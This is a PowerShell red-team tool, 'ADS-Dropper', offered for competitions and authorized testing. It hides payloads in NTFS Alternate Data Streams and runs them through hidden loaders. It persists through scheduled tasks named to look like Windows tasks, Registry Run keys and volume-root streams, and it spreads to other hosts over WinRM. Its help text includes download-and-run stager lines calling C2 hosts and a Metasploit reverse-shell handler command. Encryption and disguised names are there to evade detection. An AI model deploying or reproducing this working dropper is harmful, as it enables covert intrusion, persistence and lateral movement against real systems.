<#
.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry, WMI, Volume Root ADS).
Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
Includes AES-256 encryption, randomization, and privilege adaptation.
.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
Examples:
  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
  @('C:\payloads\imix_stager.ps1')
  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
- 'localhost' = Local deployment
- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)

Examples:
  -Targets @('localhost')
  -Targets @('10.10.10.50', 'dc01.corp.local')
.PARAMETER Persist Persistence methods (comma-separated). Default: @('task')
Available methods:
  task     - Scheduled Task (requires admin, logon + periodic triggers)
  reg      - Registry Run key (works as user or admin)
  volroot  - Volume Root ADS (requires admin, novel technique)

Examples:
  -Persist @('task')
  -Persist @('task', 'reg')
  -Persist @('volroot')
.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
Breaks signature-based detection but makes cleanup harder.

Example:
  -Randomize
.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
- Key derived from machine UUID + hostname (deterministic per-system)
- Automatically switches to PowerShell loader (VBScript can't decrypt)
- Payload stored as Base64-encoded ciphertext

Example:
  -Encrypt
.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
Use for:
- Pre-staging during recon phase
- Testing deployment without triggering C2 callbacks
- Verifying artifacts before execution

Example:
  -NoExec
.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
Required when -Targets includes remote hosts.

Example:
  -Credential (Get-Credential)
.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
Description:
Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
Creates VBScript loader at C:\ProgramData\app_log_a.vbs
Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Executes immediately
.EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
Description:
- AES-256 encrypts payload (key from UUID+hostname)
- Random file: C:\ProgramData\CacheSvc.log
- Random stream: :SmartScreen or :Zone.Identifier
- Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
- Random task: \Microsoft\Windows\UX\a3f5b2c1
.EXAMPLE # Multi-method persistence (belt-and-suspenders) .\ADS-Dropper.ps1 -Payload $c2Stager -Persist @('task', 'reg') -Encrypt
Description:
Creates TWO persistence methods:
1. Scheduled task (SYSTEM-level, periodic execution)
2. Registry Run key (user-level, executes on logon)
Ensures survival even if one method is detected/removed
.EXAMPLE # Volume root ADS (novel technique, requires admin) .\ADS-Dropper.ps1 -Payload $beacon -Persist @('volroot') -Randomize
Description:
- Stores execution command in C:\:ads_1234 (volume root ADS)
- Creates task: \Microsoft\Windows\Maintenance\WinSAT_567
- Task executes: powershell -Command "Get-Content 'C:\:ads_1234' | IEX"
- Survives directory deletions (no parent file)
.EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
Description:
Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
Use -Verbose to see deployment details.
Manually trigger later via: wscript.exe //B C:\ProgramData\app_log_a.vbs
.EXAMPLE # Lateral movement to multiple hosts $cred = Get-Credential # Prompt for domain\user credentials $targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local') .\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
Description:
- Deploys to 3 remote hosts via WinRM
- Serializes functions and executes remotely
- Each host gets unique random artifacts (if -Randomize)
.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist @('task', 'reg') -Encrypt -Randomize -Verbose
Description:
Full stealth deployment:
- Encrypted Imix stager
- Randomized artifacts (evades signatures)
- Dual persistence (task + registry)
- Verbose output for verification
.EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
.\ADS-Dropper.ps1 -Payload $msfPayload -Persist @('task') -Encrypt

Description:
Deploys Metasploit stager with encryption.
Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist @('volroot') -Randomize -Encrypt
Description:
Deploys Sliver beacon from file with volume root persistence.
.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist @('reg')
Description:
Simple persistent beacon (writes to log every 5 minutes).
No C2 connection, useful for testing persistence without network traffic.
.NOTES File Name : ADS-Dropper.ps1 Author : Louis (https://github.com/yourusername) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.1
MITRE ATT&CK Mapping:
- T1564.004: Hide Artifacts - NTFS File Attributes
- T1053.005: Scheduled Task/Job
- T1547.001: Boot or Logon Autostart Execution - Registry Run Keys

Detection:
- Sysmon Event ID 15 (FileCreateStreamHash) - ADS creation
- Windows Event ID 4698 (Task Created)
- Windows Event ID 4657 (Registry modification)

Cleanup:
Run tests/cleanup.ps1 to remove all artifacts:
  .\tests\cleanup.ps1 -Targets @('localhost')
.LINK GitHub: https://github.com/Qweary/Appartition-Delivery-System Blog: https://qweary.github.io
Research Credits:
- Oddvar Moe: https://oddvar.moe (ADS execution techniques)
- Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/
.OUTPUTS Console output showing deployment progress: - Admin status - Target hosts - Persistence methods - ADS creation confirmation - Loader path - Success/failure status
For remote deployments, returns hashtable with:
- Success (bool)
- Artifacts (hashtable with ADS path, loader path)
- Error (string, if failed)
.COMPONENT Requires NTFS filesystem (ADS not supported on FAT32/exFAT) Requires PowerShell remoting (WinRM) for lateral movement
.ROLE Red Team / Penetration Testing
AUTHORIZED USE ONLY:
- Penetration testing with written permission
- CCDC and similar competitive exercises
- Security research in isolated labs

Unauthorized use is illegal and unethical.
.FUNCTIONALITY Persistence, Execution, Defense Evasion
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)][object]$Payload,
    [string[]]$Targets = @('localhost'),
    [string[]]$Persist = @('task'),
    [switch]$Randomize,
    [switch]$Encrypt,
    [switch]$NoExec,
    [PSCredential]$Credential,
    [switch]$Help
)

# Help display function
function Show-Help {
    $helpText = @"
╔══════════════════════════════════════════════════════════════════════════╗ ║ ADS-Dropper v2.1 - Quick Reference ║ ╚══════════════════════════════════════════════════════════════════════════╝
USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
QUICK START EXAMPLES:
Local deployment (basic)
.\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
Full stealth (RECOMMENDED)
.\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize
Multiple persistence methods
.\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
Lateral movement
$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential
PERSISTENCE METHODS:
task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
volroot Volume Root ADS (admin required, NOVEL) └─ Stores command in C::ads_* └─ No parent file, survives directory wipes
ENCRYPTION:
-Encrypt enables AES-256 with machine-specific key (UUID+hostname)
Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
RANDOMIZATION:
-Randomize generates unique artifacts per deployment:
File: SystemCache.dat -> CacheSvc.log Stream: :syc_payload -> :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs -> app_log_kqmxyz.vbs Task: UsbCeip -> a3f5b2c1-... (GUID)
C2 FRAMEWORK EXAMPLES:
Realm C2 (Imix agent)
$imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
Metasploit
$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")' .\ADS-Dropper.ps1 -Payload $msf -Persist @('task')
Sliver
$sliver = @('C:\payloads\sliver.ps1') .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
DETECTION & CLEANUP:
Blue team detection: - Sysmon Event ID 15 (ADS creation) - Event ID 4698 (Task creation) - PowerShell: Get-ChildItem C:\ProgramData -Stream *
Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
TESTING:
Validation suite: .\tests\validate.ps1
Manual verification: dir /r C:\ProgramData # Show ADS schtasks /query /fo LIST # Show tasks Get-Item C::ads_* 2>$null # Check volume root
MORE INFO:
Full help: Get-Help .\ADS-Dropper.ps1 -Full Examples: Get-Help .\ADS-Dropper.ps1 -Examples Parameters: Get-Help .\ADS-Dropper.ps1 -Parameter *
GitHub: https://github.com/qweary/apparition-delivery-system Blog writeup: https://qweary.github.io
ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
"@
Write-Host $helpText -ForegroundColor Cyan
}

# Help flag intercept
if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
    $args -contains '-?' -or $args -contains '/?' -or 
    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
    Show-Help
    exit 0
}

# Main Code
if ($Targets -notcontains 'localhost' -and -not $Credential) {
    throw "Remote targets require -Credential parameter"
}

$validPersistMethods = @('task', 'reg', 'volroot')
foreach ($method in $Persist) {
    if ($method -notin $validPersistMethods) {
        throw "Invalid persistence method: $method. Valid options: $($validPersistMethods -join ', ')"
    }
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ') | Persist: $($Persist -join ', ')" -ForegroundColor Cyan

function Get-RandomADSConfig {
    $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
    $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
    $exts = @('.dat','.log','.idx','.tmp','.chk')
    
    # Calculate AES key
    $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
    
    # Stream name options (WITH colon prefix)
    $legitimateStreams = @(':Zone.Identifier', ':SmartScreen', ':Catalog', ':appcompat.txt')
    $randomStream = ':' + (-join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) }))
    
    # Return configuration hashtable
    @{
        HostPath = if($Randomize) { 
            "C:\ProgramData\$(Get-Random -InputObject $adj)$(Get-Random -InputObject $noun)$(Get-Random -InputObject $exts)"
        } else { 
            'C:\ProgramData\SystemCache.dat' 
        }
        
        StreamName = if($Randomize) { 
            Get-Random -InputObject ($legitimateStreams + $randomStream)
        } else { 
            ':syc_payload' 
        }
        
        AESKey = [Convert]::ToBase64String($keyBytes)
        
        VBSPrefix = if($Randomize) { 
            'app_log_' + (-join (1..6 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 123) })) + '.'
        } else { 
            'app_log_a.' 
        }
    }
}

function ConvertTo-PSPayload($PayloadObj) {
    if($PayloadObj -is [string]) { 
        return $PayloadObj 
    }
    
    if($PayloadObj -is [array]) { 
        $filePath = $PayloadObj[0]
        if(-not (Test-Path $filePath)) {
            throw "Payload file not found: $filePath"
        }

        try {
          $content = Get-Content $filePath -Raw -Encoding UTF8 -ErrorAction Stop
        } catch {
            throw "Failed to interpret file as UTF8 - '$filePath': $_"
        }
        
        # Try to detect if it's Base64-encoded (Imix stagers are often double-encoded)
        try {
            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
            # If successful and looks like PowerShell, return decoded
            if($decoded -match '(IEX|Invoke-Expression|Import-Module|New-Object|Get-|Set-|Start-|function\s+\w+|\$\w+\s*=)') {
                Write-Verbose "Detected Base64-encoded PowerShell, using decoded version"
                return $decoded
            }
        } catch {
            # Not Base64, return as-is
        }
        
        return $content
    }
    
    return $PayloadObj.ToString()
}

function Protect-Payload($Payload, $KeyB64) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($KeyB64)
    $aes.IV = [byte[]](0..15)
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($Payload), 0, $Payload.Length)
    return [Convert]::ToBase64String($enc)
}

function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
    try {
        # Ensure host file exists
        if(!(Test-Path $HostPath)) { 
            New-Item -Path $HostPath -ItemType File -Force -ErrorAction Stop | Out-Null
        }
        
        # Prepare payload
        $finalPayload = if($Encrypt) { 
            Protect-Payload $Payload $Config.AESKey 
        } else { 
            $Payload 
        }
        
        $cleanStreamName = $StreamName.TrimStart(':')
        $adsPath = "${HostPath}:${cleanStreamName}"
        
        # Write payload to ADS
        Set-Content -Path $adsPath -Value $finalPayload -Encoding UTF8 -Force -ErrorAction Stop
        
        Write-Host "ADS Created: $adsPath" -ForegroundColor Green
        return $adsPath
        
    } catch {
        Write-Error "Failed to create ADS: $_"
        throw
    }
}

function New-Loader($ADSPath, $Config) {
    $loaderPath = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'vbs'
    
    if($Encrypt) {
        Write-Warning "AES detected -> Using PowerShell loader"
        return New-PSLoader $ADSPath $Config
    }
    
    $vbsContent = @"
On Error Resume Next
Set shell = CreateObject("WScript.Shell")
Set strm = CreateObject("ADODB.Stream")
strm.Type = 2
strm.Charset = "utf-8"
strm.Open
strm.LoadFromFile("$ADSPath")
payload = strm.ReadText
strm.Close
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & payload & """, 0, False
"@

    $vbsContent | Out-File $loaderPath -Encoding ASCII -Force
    return $loaderPath
}

function New-PSLoader($ADSPath, $Config) {
    $ps1Path = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'ps1'
    
    # Build decryption code conditionally
    $decryptCode = if($Encrypt) {
        @"
`$aes = [System.Security.Cryptography.Aes]::Create()
`$aes.Key = [Convert]::FromBase64String('$($Config.AESKey)')
`$aes.IV = [byte[]](0..15)
`$dec = `$aes.CreateDecryptor()
`$encBytes = [Convert]::FromBase64String(`$payload)
`$decBytes = `$dec.TransformFinalBlock(`$encBytes, 0, `$encBytes.Length)
`$payload = [Text.Encoding]::UTF8.GetString(`$decBytes)
"@
    } else { "" }
    
    $loader = @"
`$strm = New-Object IO.StreamReader("$ADSPath")
`$payload = `$strm.ReadToEnd()
`$strm.Close()
$decryptCode
Invoke-Expression `$payload
"@
    
    $loader | Out-File $ps1Path -Encoding UTF8 -Force
    return $ps1Path
}

function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
    $taskArgs = "//B `"$LoaderPath`""
    
    switch($Type) {
        'task' {
            if(!$isAdmin) { Write-Warning "Admin required for tasks"; return }
            $taskName = if($Randomize) { "Microsoft\Windows\UX\$((New-Guid).Guid.Split('-')[0])" } 
                       else { "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" }
            & schtasks /create /tn $taskName /tr "wscript.exe $taskArgs" /sc onlogon /rl highest /f
        }
        'volroot' {
            if(!$isAdmin) { Write-Warning "Admin required for volroot"; return }
            
            $rootADS = "C:\:ads_$((Get-Random -Minimum 1000 -Maximum 9999))"
            
            # Store EXECUTION COMMAND
            if($LoaderPath.EndsWith('.vbs')) {
                # For VBS: Store the wscript command
                "wscript.exe //B `"$LoaderPath`"" | Set-Content -Path $rootADS -Force
            } else {
                # For PS1: Store the PowerShell source
                Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
            }
            
            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
            $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
           
            & schtasks /create /tn $taskName /tr "$action" /sc onlogon /rl highest /f 2>&1 | Out-Null
            
            Write-Verbose "VolRoot ADS: $rootADS -> Task: $taskName"
        }
        'reg' {
            $regPath = if($isAdmin) { 
                "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" 
            } else { 
                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
            }
            
            $valueName = if($Randomize) { 
                "Update_$((Get-Random -Minimum 1000 -Maximum 9999))" 
            } else { 
                "SystemUpdater" 
            }
            
            if(-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            
            Set-ItemProperty -Path $regPath -Name $valueName -Value "wscript.exe $taskArgs" -Force
            Write-Host "Registry persistence: $regPath\$valueName" -ForegroundColor Yellow
        }
        default { Write-Warning "Unknown persistence: $Type" }
    }
    Write-Host "Persist [$Type] -> $LoaderPath" -ForegroundColor Yellow
}

function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeFlag, $EncryptFlag, $NoExecFlag, $Cred) {
    # Serialize each function as a string, separated by newlines
    $allFunctions = @(
        "function Get-RandomADSConfig { $( ${function:Get-RandomADSConfig}.ToString() ) }",
        "function ConvertTo-PSPayload { $( ${function:ConvertTo-PSPayload}.ToString() ) }",
        "function Protect-Payload { $( ${function:Protect-Payload}.ToString() ) }",
        "function New-ADSPayload { $( ${function:New-ADSPayload}.ToString() ) }",
        "function New-Loader { $( ${function:New-Loader}.ToString() ) }",
        "function New-PSLoader { $( ${function:New-PSLoader}.ToString() ) }",
        "function New-PersistenceMechanism { $( ${function:New-PersistenceMechanism}.ToString() ) }"
    ) -join "`n`n"
    
    # Escape single quotes in payload for safe embedding
    $payloadBytes = [Text.Encoding]::UTF8.GetBytes($PayloadObj)
    $payloadB64 = [Convert]::ToBase64String($payloadBytes)

    $persistArray = $PersistList -join "','"
    $remoteBlock = [scriptblock]::Create(@"
`$ErrorActionPreference = 'SilentlyContinue'

# Load all functions
$allFunctions

# Execute deployment
`$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
`$Randomize = `$$RandomizeFlag
`$Encrypt = `$$EncryptFlag
`$NoExec = `$$NoExecFlag

# Convert payload
`$rawPayload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$payloadB64'))

# Create ADS and loader
`$cfg = Get-RandomADSConfig
`$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
`$loaderPath = New-Loader `$adsPath `$cfg

# Set persistence
foreach(`$pType in @('$persistArray')) { 
    New-PersistenceMechanism `$pType `$loaderPath `$cfg 
}


# Execute if requested
if(-not `$NoExec) { 
    if(`$loaderPath.EndsWith('.vbs')) { 
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "wscript.exe"
        $psi.Arguments = "//B `"$loaderPath`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } else { 
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }
}

return @{ Success = `$true; Artifacts = @{ ADS = `$adsPath; Loader = `$loaderPath } }
"@)
    
    try {
        $result = Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock $remoteBlock -ErrorAction Stop
        Write-Host "Remote deployment to $Target succeeded" -ForegroundColor Green
        return $result
    } catch {
        Write-Error "Remote deployment to $Target failed: $_"
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

foreach($target in $Targets) {
    if($target -eq 'localhost') {
        # LOCAL DEPLOYMENT
        $rawPayload = ConvertTo-PSPayload $Payload
        $cfg = Get-RandomADSConfig
        
        $adsPath = New-ADSPayload $cfg.HostPath $cfg.StreamName $rawPayload $cfg
        $loaderPath = New-Loader $adsPath $cfg
        
        foreach($pType in $Persist) { 
            New-PersistenceMechanism $pType $loaderPath $cfg
        }
        
        if(!$NoExec) { 
            if($loaderPath.EndsWith('.vbs')) { 
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wscript.exe"
                $psi.Arguments = "//B `"$loaderPath`""
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } else { 
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "powershell.exe"
                $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            }
        }
        Write-Host "Local deployment complete" -ForegroundColor Green
    } else {
        # REMOTE DEPLOYMENT
        Write-Host "-> Deploying to $target" -ForegroundColor Magenta
        Invoke-RemoteDeployment $target $Payload $Persist $Randomize.IsPresent $Encrypt.IsPresent $NoExec.IsPresent $Credential
    }
}

Write-Host "ADS-Dropper deployment complete!" -ForegroundColor Green
